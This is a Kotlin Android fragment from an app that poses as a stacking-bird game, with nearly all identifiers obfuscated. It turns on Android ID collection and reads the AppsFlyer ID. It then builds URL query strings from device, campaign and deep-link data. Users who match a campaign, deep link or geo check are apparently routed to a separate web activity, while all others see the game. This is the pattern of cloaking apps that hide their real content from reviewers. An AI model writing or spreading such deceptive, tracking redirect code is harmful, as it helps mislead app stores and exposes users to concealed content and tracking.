package com.kooapps.stackybirda.jsiiauhw
import org.koin.android.ext.android.inject
import com.appsflyer.AppsFlyerLib
import org.koin.core.qualifier.named
import androidx.fragment.app.Fragment
import android.content.Context
import android.view.ViewGroup
import android.content.Intent
import android.view.LayoutInflater
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.view.View
import com.kooapps.stackybirda.Hisiwuygeftftdf
import com.kooapps.stackybirda.Opwoiuxycx.epllpqplpplsplokxkocko
import com.kooapps.stackybirda.Opwoiuxycx.ruejijiwji
import com.kooapps.stackybirda.Opwoiuxycx.fplplsdplp
import com.kooapps.stackybirda.Opwoiuxycx.dplplplw
import com.kooapps.stackybirda.Opwoiuxycx.sdokkowkookokkookcxz
import com.kooapps.stackybirda.Opwoiuxycx.dplpclpxlpvkokojiicvjb
import com.kooapps.stackybirda.Opwoiuxycx.rxrzcrs
import com.kooapps.stackybirda.Opwoiuxycx.prllpepl
import com.kooapps.stackybirda.Opwoiuxycx.rpllpelpplspl
import com.kooapps.stackybirda.Opwoiuxycx.tdusjiijisjd
import com.kooapps.stackybirda.Opwoiuxycx.yuxzuiij
import com.kooapps.stackybirda.Opwoiuxycx.aplqplpqlplpslokxcji
import com.kooapps.stackybirda.Opwoiuxycx.jcjxjnjnjnvkokokoxcjidv
import com.kooapps.stackybirda.Opwoiuxycx.sasoakkoxko
import com.kooapps.stackybirda.Opwoiuxycx.ixzokcokkojichushu
import com.kooapps.stackybirda.Opwoiuxycx.nnvcnjnvchuuhcxjijid
import com.kooapps.stackybirda.Opwoiuxycx.okokxkozkookokcjijisijd
import com.kooapps.stackybirda.R


class Jbvxzuusd : Fragment() {
    private lateinit var rpelpwlplplpslpokokxc: Context
    val uxoockojivdji: SharedPreferences by inject(named("SharedPreferences"))

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.ncnxjvijsijd, container, false)
    }



    override fun onAttach(context: Context) {
        super.onAttach(context)
        rpelpwlplplpslpokokxc = context
    }

    override fun onStart() {
        super.onStart()
        val txrzchushudhuji = uxoockojivdji.getString(nnvcnjnvchuuhcxjijid, null)
        val apslpzplx = uxoockojivdji.getString(rxrzcrs, null)
        val flpplpckovok = uxoockojivdji.getString("mainId", null)
        val rekoookkowkokosd = "com.kooapps.stackybirda"

        val dplelpwlppql = uxoockojivdji.getString("appCamp", null)
        val torok = uxoockojivdji.getString(rpllpelpplspl, null)
        val tokykokookfkodkokgokoksd = Intent(activity, Gdooocoxivd::class.java)
        val vokokckofokd = AppsFlyerLib.getInstance().getAppsFlyerUID(rpelpwlplplpslpokokxc)
        val splwlpqpl = Build.VERSION.RELEASE

        val mmcxkivjjiijf = uxoockojivdji.getString(tdusjiijisjd, null)
        val bcxiiokkod: String? = uxoockojivdji.getString(epllpqplpplsplokxkocko, null)
        uxoockojivdji.edit().putString(sasoakkoxko, vokokckofokd).apply()
        val rlpelpwlp = uxoockojivdji.getString(sdokkowkookokkookcxz, null)


        val apososkkokoxkocjizjijis = Intent(activity, Hisiwuygeftftdf::class.java)
        val ycxhvuhu = uxoockojivdji.getString("deepSt", null)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)

        val reokwlplp = "$rlpelpwlp$okokxkozkookokcjijisijd$dplelpwlppql&$yuxzuiij$vokokckofokd&$dplpclpxlpvkokojiicvjb$flpplpckovok&$aplqplpqlplpslokxcji$rekoookkowkokosd&$ixzokcokkojichushu$splwlpqpl&$dplplplw$jcjxjnjnjnvkokokoxcjidv"
        val yxhchuhuuhdhusji = "$rlpelpwlp$yuxzuiij$apslpzplx&$dplpclpxlpvkokojiicvjb$bcxiiokkod&$aplqplpqlplpslokxcji$rekoookkowkokosd&$ixzokcokkojichushu$splwlpqpl&$dplplplw$jcjxjnjnjnvkokokoxcjidv"
        val splplalps = "$rlpelpwlp$okokxkozkookokcjijisijd$ycxhvuhu&$yuxzuiij$vokokckofokd&$dplpclpxlpvkokojiicvjb$flpplpckovok&$aplqplpqlplpslokxcji$rekoookkowkokosd&$ixzokcokkojichushu$splwlpqpl&$dplplplw$prllpepl"
        val xjncjnjnjisjid = "$rlpelpwlp$okokxkozkookokcjijisijd$ycxhvuhu&$yuxzuiij$apslpzplx&$dplpclpxlpvkokojiicvjb$bcxiiokkod&$aplqplpqlplpslokxcji$rekoookkowkokosd&$ixzokcokkojichushu$splwlpqpl&$dplplplw$prllpepl"

        when(torok) {
            "1" ->
                if(dplelpwlppql!!.contains(ruejijiwji)) {
                    uxoockojivdji.edit().putString(fplplsdplp, reokwlplp).apply()
                    uxoockojivdji.edit().putString("WebInt", "campaign").apply()
                    startActivity(tokykokookfkodkokgokoksd)
                    activity?.finish()
                } else if (ycxhvuhu!=null||mmcxkivjjiijf!!.contains(txrzchushudhuji.toString())) {
                    uxoockojivdji.edit().putString(fplplsdplp, splplalps).apply()
                    uxoockojivdji.edit().putString("WebInt", "deepLink").apply()
                    startActivity(tokykokookfkodkokgokoksd)
                    activity?.finish()
                } else {
                    startActivity(apososkkokoxkocjizjijis)
                    activity?.finish()
                }
            "0" ->
                if(ycxhvuhu!=null) {
                    uxoockojivdji.edit().putString(fplplsdplp, xjncjnjnjisjid).apply()
                    uxoockojivdji.edit().putString("WebInt", "deepLinkNOApps").apply()
                    startActivity(tokykokookfkodkokgokoksd)
                    activity?.finish()
                } else if (mmcxkivjjiijf!!.contains(txrzchushudhuji.toString())) {
                    uxoockojivdji.edit().putString(fplplsdplp, yxhchuhuuhdhusji).apply()
                    uxoockojivdji.edit().putString("WebInt", "geo").apply()
                    startActivity(tokykokookfkodkokgokoksd)
                    activity?.finish()
                } else {
                    startActivity(apososkkokoxkocjizjijis)
                    activity?.finish()
                }
        }
    }










}
